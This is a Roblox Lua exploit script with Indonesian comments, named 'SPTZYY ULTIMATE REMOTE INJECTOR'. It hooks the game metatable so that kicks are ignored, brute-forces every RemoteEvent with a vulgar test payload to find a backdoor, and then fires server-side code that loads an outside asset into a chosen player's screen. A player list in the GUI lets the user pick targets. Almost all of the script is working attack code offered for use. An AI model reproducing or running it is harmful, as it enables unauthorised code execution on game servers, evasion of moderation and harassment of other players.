-- [[ SPTZYY ULTIMATE REMOTE INJECTOR ]] --
-- Logika: Remote Brute-Force + Asset Injection + Target List

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local lp = Players.LocalPlayer

-- Variabel Core dari Logika Kamu
local modelName = "sptzyy"
local zyy = nil
local lastFired = nil
local isScanning = false

-- [[ ANTI-KICK BYPASS ]] --
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
    if getnamecallmethod() == "Kick" then return nil end
    return old(self, ...)
end)
setreadonly(mt, true)

-- [[ UI SETUP ]] --
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 350, 0, 420)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -210)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.Visible = false
Instance.new("UICorner", MainFrame)

local Title = Instance.new("TextLabel", MainFrame)
Title.Size = UDim2.new(1, 0, 0, 45)
Title.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Title.Text = "SPTZYY REMOTE EXPLOIT"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Font = Enum.Font.Code
Instance.new("UICorner", Title)

-- Player Scrolling List
local ScrollFrame = Instance.new("ScrollingFrame", MainFrame)
ScrollFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
ScrollFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
ScrollFrame.BackgroundTransparency = 1
ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollFrame.ScrollBarThickness = 2
local UIList = Instance.new("UIListLayout", ScrollFrame)
UIList.Padding = UDim.new(0, 5)

-- Status Log
local StatusLabel = Instance.new("TextLabel", MainFrame)
StatusLabel.Size = UDim2.new(0.9, 0, 0, 30)
StatusLabel.Position = UDim2.new(0.05, 0, 0.78, 0)
StatusLabel.BackgroundColor3 = Color3.new(0, 0, 0)
StatusLabel.Text = "Status: Menunggu Scan..."
StatusLabel.TextColor3 = Color3.new(1, 1, 0)
StatusLabel.TextSize = 10
Instance.new("UICorner", StatusLabel)

-- ==========================================
-- LOGIKA SCANNER (Disesuaikan dengan permintaanmu)
-- ==========================================
workspace.ChildAdded:Connect(function(child)
    if child.Name == modelName and zyy == nil then
        zyy = lastFired
        StatusLabel.Text = "VULNERABILITY FOUND: " .. tostring(zyy)
        StatusLabel.TextColor3 = Color3.new(0, 1, 0)
    end
end)

local function RunScan()
    if isScanning then return end
    isScanning = true
    StatusLabel.Text = "Scanning Remotes... (Brute Force)"
    
    local payload = " KONTOL MESUM😂 " -- Pesan awal untuk trigger

    for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(function()
                remote:FireServer(payload)
            end)
            lastFired = remote
            RunService.RenderStepped:Wait()
        end
    end
    isScanning = false
end

-- ==========================================
-- LOGIKA INJECTION TARGET
-- ==========================================
local function InjectToTarget(target)
    if zyy and typeof(zyy) == "Instance" then
        StatusLabel.Text = "Injecting to: " .. target.Name
        local insertPayload = [[
            local player = game.Players:FindFirstChild("]] .. target.Name .. [[")
            if player and player:FindFirstChild("PlayerGui") then
                local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
                asset.Parent = player.PlayerGui
                for _, child in ipairs(asset:GetChildren()) do
                    child.Parent = player.PlayerGui
                end
                asset:Destroy()
            end
        ]]
        zyy:FireServer(insertPayload)
    else
        StatusLabel.Text = "Gagal: Remote 'zyy' belum ditemukan!"
        StatusLabel.TextColor3 = Color3.new(1, 0, 0)
        RunScan() -- Coba scan ulang
    end
end

-- ==========================================
-- UI CONTROLS
-- ==========================================
local function RefreshList()
    for _, c in pairs(ScrollFrame:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
    for _, p in pairs(Players:GetPlayers()) do
        local b = Instance.new("TextButton", ScrollFrame)
        b.Size = UDim2.new(1, 0, 0, 30)
        b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        b.Text = p.Name
        b.TextColor3 = Color3.new(1, 1, 1)
        b.Font = Enum.Font.SourceSansBold
        Instance.new("UICorner", b)
        b.MouseButton1Click:Connect(function() InjectToTarget(p) end)
    end
    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, #Players:GetPlayers() * 35)
end

local ScanBtn = Instance.new("TextButton", MainFrame)
ScanBtn.Size = UDim2.new(0.9, 0, 0, 40)
ScanBtn.Position = UDim2.new(0.05, 0, 0.88, 0)
ScanBtn.Text = "RE-SCAN REMOTES"
ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 0)
ScanBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", ScanBtn)
ScanBtn.MouseButton1Click:Connect(RunScan)

-- Icon Toggle
local Icon = Instance.new("ImageButton", ScreenGui)
Icon.Size = UDim2.new(0, 60, 0, 60)
Icon.Position = UDim2.new(0.05, 0, 0.4, 0)
Icon.Image = "rbxassetid://6031280227"
Icon.Draggable = true
Icon.Active = true
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1, 0)
Icon.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
    if MainFrame.Visible then RefreshList() end
end)
